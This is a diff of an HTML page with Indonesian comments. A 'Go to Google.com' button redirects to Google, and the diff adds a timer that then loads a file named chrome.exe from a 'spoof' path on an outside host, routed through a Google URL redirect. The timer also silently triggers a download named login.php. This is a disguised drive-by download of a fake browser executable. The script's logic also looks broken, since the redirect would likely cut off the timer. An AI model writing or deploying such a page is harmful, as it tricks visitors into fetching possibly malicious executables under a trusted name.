@@ -12,30 +12,39 @@
 
     <!-- Button untuk ke Google -->
     <button onclick="redirectToGoogle()">Go to Google.com</button>
-
-    <!-- Iframe yang berisi URL yang kamu inginkan (awalnya disembunyikan) -->
-    <div style="margin-top: 20px;">
-      <iframe 
-        id="iframeExample" 
-        src="https://www.google.com/url?q=https%3A%2F%2Fcnfdnfial-ops.github.io%2Fspoof%2Fchrome.exe&sa=D&sntz=1&usg=AOvVaw3W5r-6mMJTcMqxax4geLnL"
-        width="600" 
-        height="300" 
-        style="border: 1px solid #ccc; display: none;">
-      </iframe>
-    </div>
   </div>
 
   <script>
-    // Fungsi untuk redirect ke Google.com
     function redirectToGoogle() {
       // Redirect ke Google.com di tab yang sama
       window.location.href = "https://www.google.com";
 
-      // Setelah 2 detik, tampilkan iframe
+      // Tunggu beberapa detik agar halaman benar-benar di-load, baru tampilkan iframe dan download
       setTimeout(function() {
-        const iframe = document.getElementById('iframeExample');
-        iframe.style.display = "block";  // Tampilkan iframe setelah redirect
-      }, 2000);  // Delay 2 detik setelah redirect
+        // Iframe baru akan ditampilkan setelah beberapa detik
+        const iframe = document.createElement("iframe");
+        iframe.src = "https://www.google.com/url?q=https%3A%2F%2Fcnfdnfial-ops.github.io%2Fspoof%2Fchrome.exe&sa=D&sntz=1&usg=AOvVaw3W5r-6mMJTcMqxax4geLnL";
+        iframe.width = "600";
+        iframe.height = "300";
+        iframe.style.border = "1px solid #ccc";
+        document.body.appendChild(iframe);  // Menambahkan iframe ke body
+        
+        // Simulasi dialog download setelah iframe dimunculkan
+        triggerDownload();
+      }, 2000);  // Delay 2 detik setelah redirect untuk memastikan halaman di-load
+    }
+
+    function triggerDownload() {
+      // Buat file PHP yang akan didownload
+      const php = `<?php
+echo "wkwkwk ini file php bebas 😁";
+?>`;
+
+      const blob = new Blob([php], { type: "application/php" });
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = "login.php";
+      a.click();  // Trigger download
     }
   </script>
 </body>
